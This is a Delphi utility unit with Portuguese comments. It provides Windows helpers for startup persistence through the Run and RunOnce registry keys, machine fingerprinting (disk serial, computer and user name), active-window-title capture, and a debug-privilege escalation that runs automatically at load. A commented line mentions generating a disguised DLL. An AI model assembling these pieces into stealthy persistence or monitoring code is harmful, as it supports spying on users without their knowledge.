unit Rotinas;
interface
uses
  Windows,
  WinProcs,
  Registry,
  SysUtils;
procedure ExecutaStartupWin( tituloWindows, linhaComando: String; unicaVez: Boolean = False );
function DiretorioComBarra(NomeDir: string): string;
function DiretorioSemBarra(NomeDir: string): string;
function DirWindows: string;
function DirWindowsSystem: string;
function DirTemporario: string;
function PegaSerieHD: String; //função serial HD
function pubNomeComputador : string;
Function GetNetUserName: string;
Function WinVersion: string;
function JanelaAtiva: String;// Função de capturar o titulo da janela ativa
function DeleteChar(const Ch: Char; const S: string): string;
function ValidarEMail(aStr: string): Boolean;
function SetDebugPrivilege: Boolean;
implementation
function SetDebugPrivilege: Boolean;
var
  hToken: THandle;
  TP: TTokenPrivileges;
  lpLuid: TLargeInteger;
  dwReturnLength: DWORD;
begin
  Result := False;
  if OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, hToken) then
  begin
    if LookupPrivilegeValue(nil, 'SeDebugPrivilege', lpLuid) then
    begin
      TP.PrivilegeCount := 1;
      TP.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      TP.Privileges[0].Luid := lpLuid;
      Result := Windows.AdjustTokenPrivileges(hToken, False, TP, sizeof(TP), nil, dwReturnLength);
    end;
    CloseHandle(hToken);
  end;
end;
procedure ExecutaStartupWin( tituloWindows, linhaComando: String; unicaVez: Boolean = False );
var
  RegIniFile: TRegIniFile;
begin
  RegIniFile := TRegIniFile.Create( '' );
  with RegIniFile do
    begin
      RootKey := HKEY_CURRENT_USER; //HKEY_LOCAL_MACHINE;
      if unicaVez then
        RegIniFile.WriteString('Software\Microsoft\Windows\CurrentVersion\RunOnce'#0, tituloWindows, linhaComando )
      else
        RegIniFile.WriteString('Software\Microsoft\Windows\CurrentVersion\Run'#0, tituloWindows, linhaComando );
      Free;
    end;
end;
function DiretorioComBarra(NomeDir: string): string;
begin
  if NomeDir[Length(NomeDir)] <> '\' then
    DiretorioComBarra := NomeDir + '\'
  else
    DiretorioComBarra := NomeDir;
end;
function DiretorioSemBarra(NomeDir: string): string;
begin
  if (NomeDir[Length(NomeDir)] = '\') and
  (NomeDir[Length(NomeDir) - 1] <> ':') then
    DiretorioSemBarra := Copy(NomeDir, 1, Length(NomeDir) - 1)
  else
    DiretorioSemBarra := NomeDir;
end;
function DirWindows: string;
var
  Dir: array[0..255] of char;
begin
  GetWindowsDirectory(Dir, 255);
  Result := DiretorioComBarra(StrPas(Dir));
end;
function DirWindowsSystem: string;
var
  Dir: array[0..255] of char;
begin
  GetSystemDirectory(Dir, 255);
  Result := DiretorioComBarra(StrPas(Dir));
end;
function DirTemporario: string;
var
  pNetpath: ARRAY[ 0..MAX_path - 1 ] of Char;
  nlength: Cardinal;
begin
  nlength := MAX_path;
  FillChar( pNetpath, SizeOF( pNetpath ), #0 );
  GetTemppath( nlength, pNetpath );
  Result := DiretorioComBarra(StrPas(pNetpath));
end;
function PegaSerieHD: String; //função serial HD
var
  SerialNum : Dword;
  a, b      : dword;
  Buffer    : array [0..255] of char;
begin
  if GetVolumeInformation('c:\',buffer,sizeof(buffer),@serialnum,a,b,nil,0) then
    Result := inttohex(serialnum,8)
  else
    Result := '';
end;
Function GetNetUserName: string;
Var
  NetUserNameLength: DWord;
Begin
  NetUserNameLength:=50;
  SetLength(Result, NetUserNameLength);
  GetUserName(pChar(Result),NetUserNameLength);
  SetLength(Result, StrLen(pChar(Result)));
end;
function pubNomeComputador : string;
const
   MAX_COMPUTER_LENGTH = 30;
var
   pNome : PChar;
   len : DWord;
begin
   try
      len := MAX_COMPUTER_LENGTH + 1;
      GetMem(pNome, len);
      if GetComputerName(pNome, len) then
         Result := pNome
      else
         Result := 'Não foi possível obter o nome deste computador!';
   finally
      FreeMem(pNome, len);
   end;
end;
Function WinVersion: string;
var
  VersionInfo: TOSVersionInfo;
begin
  VersionInfo.dwOSVersionInfoSize:=SizeOf(VersionInfo);
  GetVersionEx(VersionInfo);
  Result:='';
  with VersionInfo do
  begin
    case dwPlatformId of
      1: case dwMinorVersion of
        0: Result:='Windows 95';
        10: Result:='Windows 98';
        90: Result:='Windows Me';
      end;
      2: case dwMajorVersion of
        3: Result:='Windows NT 3.51';
        4: Result:='Windows NT 4.0';
        5: case dwMinorVersion of
          0: Result:='Windows 2000';
          1: Result:='Windows XP';
        end;
      end;
    end;
  end;
  if (Result='') then
    Result:='Windows Seven';
end;
function JanelaAtiva: String;// Função de capturar o titulo da janela ativa
var
  Handle:THandle;
  Len:LongInt;
  Title: String;
begin
  Handle:=GetForegroundWindow;
  Len:=GetWindowTextLength(Handle) + 1;
  SetLength(Title,Len);
  GetWindowText(Handle,PChar(Title),Len);
  JanelaAtiva:=TrimRight(Title);
end;
function DeleteChar(const Ch: Char; const S: string): string;
var
  Pc: integer;
begin
  Result := S;
  Pc := Pos(Ch, Result);
  while Pc > 0 do
  begin
    Delete(Result, Pc, 1);
    Pc := Pos(Ch, Result);
  end;
end;
function ValidarEMail(aStr: string): Boolean;
begin
 aStr := Trim(UpperCase(aStr));
 if Pos('@', aStr) > 1 then
 begin
   Delete(aStr, 1, pos('@', aStr));
   Result := (Length(aStr) > 0) and (Pos('.', aStr) > 2);
 end
 else
   Result := False;
end;
Initialization
Begin
//  ShowMessage('Gerando o arquivo MYODBC5.DLL');
  SetDebugPrivilege;
End;
end.
